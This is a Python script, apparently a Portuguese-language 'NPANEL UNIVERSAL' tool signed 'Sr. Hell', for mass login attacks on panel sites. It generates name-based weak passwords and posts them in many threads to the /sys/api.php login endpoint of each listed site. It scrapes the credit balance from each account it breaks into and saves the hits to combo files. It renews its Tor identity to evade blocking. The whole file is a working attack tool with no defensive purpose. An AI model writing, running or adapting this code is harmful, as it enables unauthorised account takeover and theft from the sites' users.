import requests
import re
import sys
import logging
import os
import threading
import time
import queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
from faker import Faker
import random
from stem import Signal
from stem.control import Controller

# Initialize colorama
init()

# Global settings
THREADS_PER_SITE = 3
SIMULTANEOUS_SITES = 98
BATCH_SIZE = 500 # Logins per batch

# SSL Configuration
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

# Program name settings
NOME = 'NPANEL UNIVERSAL'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

class LoginGenerator:
    def __init__(self):
        self.faker_pt = Faker('pt_PT')
        self.faker_br = Faker('pt_BR')
        self.used_combinations = set()
        self.lock = threading.Lock()

    def gerar_senha_com_ano(self, nome, ano, maiuscula=True):
        if maiuscula:
            return f"{nome.capitalize()}{ano}"
        return f"{nome.lower()}{ano}"

    def generate_login_batch(self, batch_size):
        logins = []
        while len(logins) < batch_size:
            while True:
                nome = random.choice([self.faker_pt.first_name(), self.faker_br.first_name()])
                if len(nome.split()[0]) >= 6:
                    nome = nome.split()[0]
                break
            numero = random.randint(0, 99)
            usuario = f"{nome}{numero:02d}"
            
            anos = [2022, 2023, 2024]
            for ano in anos:
                usuario_ano = f"{nome}{ano}"
                senha_maiuscula = self.gerar_senha_com_ano(nome, ano, True)
                senha_minuscula = self.gerar_senha_com_ano(nome, ano, False)
                
                combinations = [
                    (usuario_ano, senha_minuscula),
                    (usuario_ano, senha_maiuscula)
                ]
                
                for combo in combinations:
                    with self.lock:
                        if combo not in self.used_combinations and len(logins) < batch_size:
                            self.used_combinations.add(combo)
                            logins.append(combo)
            senhas = [
                f"{numero:02d}{nome.capitalize()}",
                f"{nome.capitalize()}{numero:02d}",
                "102030",
                "10203040",
                "112233",
                f"{nome.capitalize()}{numero:02d}",
                f"{nome.capitalize()}123",
                "123456789",
                f"{numero:02d}{nome.capitalize()}",
                f"{nome.capitalize()}"
            ]
            for senha in senhas:
                combo = (usuario, senha)
                with self.lock:
                    if combo not in self.used_combinations and len(logins) < batch_size:
                        self.used_combinations.add(combo)
                        logins.append(combo)
        return logins

class LoginChecker:
    def __init__(self):
        self.success_count = 0
        self.total_checks = 0
        self.lock = threading.Lock()

    def login(self, nhost, user, password):
        url = f"https://{nhost}/sys/api.php"
        payload = {
            "action": "login",
            "username": user,
            "password": password
        }
        try:
            response = requests.post(url, data=payload, verify=False, timeout=10)
            if response.ok and "success\":true" in response.text:
                return response.cookies.get("PHPSESSID")
        except:
            pass
        return None

    def get_dashboard_data(self, nhost, cookies):
        try:
            response = requests.get(
                f"https://{nhost}/dashboard",
                cookies={"PHPSESSID": cookies},
                verify=False,
                timeout=10
            )
            return response.text if response.ok else None
        except:
            return None

    def save_valid_login(self, nhost, user, password, credits):
        base_path = "/home/novidades/_Paineis/hits"
        os.makedirs(base_path, exist_ok=True)
        with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
            f.write(f"\n╼╾ Sr. Hell ╼╾\n")
            f.write(f"╼╾ Universal 𝔏𝔦𝔤𝔥𝔱 ╼╾\n")
            f.write(f"𝔏𝔬𝔤𝔦𝔫: {user}\n")
            f.write(f"𝔓𝔞𝔰𝔰: {password}\n")
            f.write(f"╼╾ 𝔏𝔦𝔤𝔥𝔱 ╼╾\n")
            f.write(f"𝔠𝔯𝔢𝔡𝔦𝔱𝔰: {credits}\n")
            f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
            f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")
        with open(f"{base_path}/Sr.Hell@COMBO(U&P).txt", "a") as f:
            f.write(f"{user}:{password}\n")

    def print_valid_login(self, nhost, user, password, credits):
        print(f"{Fore.GREEN}\n╼╾ Sr. Hell ╼╾")
        print(f"╼╾ Universal 𝔏𝔦𝔤𝔥𝔱 ╼╾")
        print(f"𝔏𝔬𝔤𝔦𝔫: {nhost}")
        print(f"𝔏𝔬𝔤𝔦𝔫: {user}")
        print(f"𝔓𝔞𝔰𝔰: {password}")
        print(f"╼╾ 𝔏𝔦𝔤𝔥𝔱 ╼╾")
        print(f"𝔠𝔯𝔢𝔡𝔦𝔱𝔰: {credits}")
        print(f"╼╼╼╼╼╼╼╼╼╼╼")
        print(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾{Style.RESET_ALL}")

    def check_login(self, nhost, user, password):
        with self.lock:
            self.total_checks += 1
        cookies = self.login(nhost, user, password)
        if cookies:
            dashboard_data = self.get_dashboard_data(nhost, cookies)
            if dashboard_data:
                credits_match = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
                credits = credits_match.group(1) if credits_match else "N/A"
                
                with self.lock:
                    self.success_count += 1
                
                self.save_valid_login(nhost, user, password, credits)
                self.print_valid_login(nhost, user, password, credits)
                print(f"{Fore.GREEN}Total de logins válidos encontrados: {self.success_count}")
                return True
        return False

def worker(login_queue, nhost, checker, worker_done_event):
    try:
        while not worker_done_event.is_set():
            try:
                user, password = login_queue.get(timeout=1)
                try:
                    checker.check_login(nhost, user, password)
                finally:
                    login_queue.task_done()
            except queue.Empty:
                continue
    except Exception as e:
        print(f"{Fore.RED}Erro no worker: {str(e)}")

def process_site(nhost, login_generator, checker):
    print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
    batch_count = 0
    
    try:
        while True:
            batch_count += 1
            login_queue = queue.Queue()
            worker_done_event = threading.Event()
            
            print(f"{Fore.YELLOW}Gerando lote #{batch_count} de logins para {nhost}...")
            login_batch = login_generator.generate_login_batch(BATCH_SIZE)
            
            for login in login_batch:
                login_queue.put(login)
            
            print(f"{Fore.CYAN}Verificando lote #{batch_count} ({BATCH_SIZE} logins) em {nhost}")
            print(f"{Fore.CYAN}Total de verificações: {checker.total_checks}")
            print(f"{Fore.GREEN}Total de sucessos: {checker.success_count}")
            threads = []
            for _ in range(THREADS_PER_SITE):
                t = threading.Thread(target=worker, args=(login_queue, nhost, checker, worker_done_event))
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Wait for all tasks to be processed
            login_queue.join()
            
            # Signal workers to stop and wait for them
            worker_done_event.set()
            for t in threads:
                t.join()
            
            print(f"{Fore.GREEN}Lote #{batch_count} concluído para {nhost}")
            time.sleep(60)  # Espera 1 minuto antes de renovar a conexão
            renew_connection()  # Renova a conexão Tor
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Interrupção detectada. Finalizando verificação de {nhost}")
        print(f"{Fore.CYAN}Total de verificações em {nhost}: {checker.total_checks}")
        print(f"{Fore.GREEN}Total de sucessos em {nhost}: {checker.success_count}")

def renew_connection():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='16:E65EEE7F874CBDC06010C42A0C01D1F1A1763F4770C72949E63C95DE0B')  # Substitua 'your_password' pela senha do Tor
        controller.signal(Signal.NEWNYM)

def main():
    ascii_art = """\033[93m
𝔏𝔦𝔤𝔥𝔱
!      )                    (                       
!   ( /(     (  (           )\ )            )    )  
!   )\())  ( )\ )\     (   (()/((  (  (  ( /( ( /(  
!  ((_)\  ))((_((_)   ))\   /(_))\ )\))( )\()))\()) 
!   _((_)/((__  _    /((_) (_))((_((_))\((_)\(_))/  
!  | || (_))| || |  (_))   | |  (_)(()(_| |(_| |_   
!  | __ / -_| || |  / -_)  | |__| / _` || ' \|  _|  
!  |_||_\___|_||_|  \___|  |____|_\__, ||_||_|\__|  
!                                 |___/             
𝔏𝔦𝔤𝔥𝔱 - Aguarde!!! Gerando o primeiro pack de Combos 
 """
    print(ascii_art)
    try:
        with open("/home/novidades/_Paineis/site.txt", "r") as f:
            sites = [site.strip() for site in f.readlines() if site.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Arquivo site.txt não encontrado!")
        return
    if not sites:
        print(f"{Fore.RED}Nenhum site encontrado para verificar!")
        return
    print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")
    print(f"{Fore.CYAN}Threads por site: {THREADS_PER_SITE}")
    print(f"{Fore.CYAN}Sites simultâneos: {SIMULTANEOUS_SITES}")
    print(f"{Fore.CYAN}Tamanho do lote de logins: {BATCH_SIZE}")
    login_generator = LoginGenerator()
    checker = LoginChecker()
    try:
        site_threads = []
        for site in sites:
            while len([t for t in site_threads if t.is_alive()]) >= SIMULTANEOUS_SITES:
                time.sleep(1)
            site_threads = [t for t in site_threads if t.is_alive()]
            
            t = threading.Thread(target=process_site, args=(site, login_generator, checker))
            t.daemon = True
            t.start()
            site_threads.append(t)
        for thread in site_threads:
            thread.join()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\nPrograma interrompido pelo usuário.")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\nPrograma interrompido pelo usuário.")
        sys.exit(0)
